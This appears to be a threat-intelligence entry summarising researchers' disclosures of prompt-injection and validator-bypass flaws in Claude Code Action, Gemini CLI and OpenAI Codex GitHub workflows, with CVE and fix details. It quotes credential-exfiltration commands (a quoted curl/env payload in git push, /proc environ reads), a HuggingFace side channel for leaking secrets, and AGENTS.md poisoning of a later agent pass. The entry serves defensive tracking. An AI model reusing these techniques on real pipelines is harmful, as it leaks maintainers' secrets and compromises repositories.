    discovery_trace: "first seen at: S3 sweep coverage-gap recovery (main-agent-supplied lead) → primary: novee.security/blog/critical-flaws-in-anthropic-google-and-openais-coding-agents (published 2026-08-05, fetched via WebFetch outbound-links template and via python3 tools/fetch_source.py url for verbatim quote extraction) → pivot for CVE-2026-54316: nvd.nist.gov/vuln/detail/CVE-2026-54316 (fetched via bridge, auto-fell-back to jina reader; revealed the CVE covers ONLY the Round-3 HuggingFace/WebFetch issue) → primary: github.com/anthropics/claude-code/security/advisories/GHSA-fg94-h982-f3mm (fetched directly, confirms CVSS v4.0 6.0 MEDIUM from CNA GitHub Inc., published 2026-06-13 by ddworken) → primary: python3 tools/fetch_source.py osv vuln GHSA-wpqr-6v78-jr5g and GHSA-fg94-h982-f3mm (OSV structured records, cross-checked against the GitHub advisory pages fetched directly) → primary: github.com/google-github-actions/run-gemini-cli/security/advisories/GHSA-wpqr-6v78-jr5g (fetched directly, confirms CVSS 3.1 10.0 CRITICAL, published 2026-04-24, credits Elad Meged/Novee Security and Dan Lisichkin/Pillar Security) → cross-check: python3 tools/fetch_source.py osv query npm @anthropic-ai/claude-code (enumerated all 28 published Claude Code GHSAs; no separate advisory matches the blog's Round 1 git-receive-pack RCE or Round 2 tac/rev + display_report leak, both apparently fixed without a distinct public GHSA/CVE) → dedup check: work/2026-08-10T0411Z-intel/prior_coverage.json and entities/registry.yaml (found existing entity trend:claude-code-action-github-issue-supply-chain from 2026-06-05/GMO Flatt Security, a DIFFERENT root cause — [bot]-suffix actor bypass in checkWritePermissions() — that also ends in /proc/self/environ theft; found existing operational entries for Elastic's coding-agent LaunchAgent/tunnel telemetry (2026-08-08), Check Point's workerd sandbox escape (2026-08-08), Wiz's H1 2026 cloud threat report (2026-08-08), and weekly W32 syntheses on the AI attack surface and open-source supply chain — none of these describe the specific validator-bypass mechanics or the OpenAI Codex AGENTS.md finding in this report)"
    summary: |
      Novee Security researcher Elad Meged published a Black Hat USA 2026 write-up (2026-08-05) describing three separately root-caused coding-agent CI harness vulnerabilities, tested on each vendor's own public repository in default configuration. DEDUP FINDING (see extended_notes for the full analysis): the underlying CVEs for two of the three vendors were disclosed and already fixed weeks to months before this write-up — this is a retrospective technical explainer, not fresh vulnerability news, for Anthropic and Google; the OpenAI Codex finding is genuinely new and carries no CVE at all. ANTHROPIC CLAUDE CODE ACTION (tag mode, default config, on anthropics/claude-code): three chained rounds of patch-and-bypass. Round 1 — the tag-mode default Bash allowlist approves any command matching the prefix "git push:*"; Claude Code's 23-check command-injection validation pipeline strips single-quoted content before inspecting a command (to avoid false positives on literal pipe/metacharacters inside quotes), so an attacker-injected `git push --receive-pack='sh -c "curl ...&& env|base64..."'` passes validation with the payload hidden inside quotes, then git itself executes the quoted value as a command via the --receive-pack flag, yielding RCE on the runner and exfiltrating GITHUB_TOKEN and ANTHROPIC_API_KEY; fixed via an explicit git-push allowlist and removal of most Bash tools (no CVE/GHSA identified for this specific round in the sources reviewed). Round 2 — after Round 1's fix, five shell commands (tac, rev, fold, expand, unexpand) remain in a hardcoded READ_ONLY_COMMANDS set that auto-approves execution but are absent from a separate PATH_CHECKED set that enforces workspace-relative paths, so `tac /etc/hosts` (or any file) bypasses the intended workspace confinement; a dedicated regex guard for /proc/*/environ access is defeated because bash's own quote-removal turns `rev /proc/self/enviro""n` into a read of /proc/self/environ while the regex, run before shell quote-removal, never matches the literal string "environ"; the leaked (reversed) ANTHROPIC_API_KEY and GITHUB_TOKEN are then exposed via `display_report: true`, which by default writes every tool result to the public GitHub Actions Step Summary — and GitHub's secret masking does not match reversed strings; fixed by disabling display_report and sanitizing output (no distinct CVE/GHSA identified). Round 3 — WebFetch (GET-only, same-host redirects only) pre-approves roughly 88 domains including huggingface.co as a bare hostname with any path; an attacker who registers 64 HuggingFace repos (one per possible secret character) can have the compromised agent fetch attacker/char-<c>/resolve/main/config.json for each character of a secret it can read, and HuggingFace's publicly readable per-repo download counter reveals which repo's counter incremented — recovering the secret with zero outbound network anomaly and no POST. This round is the one with a formal identifier: CVE-2026-54316 / GHSA-fg94-h982-f3mm (GitHub CNA, published 2026-06-13, NVD mirrored 2026-06-23), CWE-183/CWE-200/CWE-515, CVSS v4.0 6.0 MEDIUM per the CNA (GitHub, Inc.) — AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N — with NVD's own independent CVSS v3.1 reassessment at 9.1 CRITICAL; affects @anthropic-ai/claude-code 0.2.54 up to (but not including) 2.1.163, fixed in 2.1.163. The GHSA explicitly thanks "hackerone.com/novee" for the report. GOOGLE GEMINI CLI (run-gemini-cli GitHub Action, yolo mode, default config, on google-gemini/gemini-cli, 106k+ stars): the workflow's coreTools allowlist (`run_shell_command(echo)`, `run_shell_command(gh issue view)`) is enforced only at tool-registration time via a prefix match (`toolName.startsWith("run_shell_command(")`), which registers the full unrestricted ShellTool regardless of the parenthesized argument; the runtime canExecute() gate never re-checks which specific commands are permitted, so any shell command the model is prompt-injected into requesting executes under yolo mode. Separately, Gemini CLI's credential protection strips secrets from the child process environment before spawning it (so `env` in the child shows no GITHUB_TOKEN/GEMINI_API_KEY), but the child shares the parent Node process's UID and PID namespace with no unshare/hidepid, so `cat /proc/$PPID/environ | tr '\0' '\n'` reads the still-unsanitized parent environment directly, recovering both secrets. Chained: full shell access plus the leaked GITHUB_TOKEN lets an attacker dispatch a second workflow carrying contents:write, extract that token, and push to main on a repository with roughly two million monthly downstream installs. This is GHSA-wpqr-6v78-jr5g / CVE-2026-12537 (GitHub CNA, published 2026-04-24), CVSS 3.1 10.0 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) as assigned in Google's own advisory; fixed in @google/gemini-cli 0.39.1 (and 0.40.0-preview.3) and google-github-actions/run-gemini-cli 0.1.22; Google's remediation is described as "a breaking change to how non-interactive (headless) environments handle folder trust" rather than a drop-in patch, so downstream workflows pinning an older gemini-cli version or not opting into the new trust model remain exposed. Credited jointly to Elad Meged (Novee Security) and Dan Lisichkin (Pillar Security). OPENAI CODEX (issue-deduplicator.yml on openai/codex, 103,000 stars) — THE GENUINELY NEW FINDING, NO CVE ASSIGNED: the workflow runs two Codex passes in one job sharing one checkout/workspace. Pass 1 (workspace-write sandbox) reads the attacker's GitHub issue body; if Pass 1's output fails the workflow's JSON-schema validation (`normalize-all` sets has_matches=false), that failure — not a bypass of validation, but the validation correctly firing — is exactly the condition that triggers Pass 2. Codex's sandbox already protects .git/, .agents/, and .codex/ as read-only subpaths specifically because a write to Codex's own metadata "changes how the agent behaves on the next run" (OpenAI's own code comments state this reasoning for .git/hooks/pre-commit and .codex/config.toml); AGENTS.md — Codex's own default instruction file, loaded from disk via get_user_instructions() on every invocation and treated as authoritative — is a file, not a directory, and was never added to that protected list, so Pass 1 can write it during its normal workspace-write access. Pass 2's fresh `codex exec` in the same directory then loads the attacker-written AGENTS.md as its own standing instructions for every subsequent action, and it is precisely the pass a workflow author is likely to entrust with the deploy key, registry credential, or write-scoped GITHUB_TOKEN, because Pass 2 "never touched" the untrusted input. OpenAI's response, three days after the report, split the two passes into separate jobs with separate checkouts (breaking the persistence path on openai/codex itself), later removed the shared checkout entirely, runs every Codex step drop-sudo in a read-only sandbox, and documents AGENTS.md in workflows as an untrusted input surface — but this hardening lives only on openai/codex; no CVE or GHSA was assigned because OpenAI's position is that the sandbox behaved as documented, and the researcher states other public repositories were found running the identical multi-pass pattern on the same default sandbox.
    region_nexus: "global — no Swiss/EU-specific targeting; relevant wherever this constituency's software-development or CI/CD estate runs Claude Code Action, Gemini CLI, or OpenAI Codex GitHub Actions workflows triggered by external/untrusted GitHub issues."
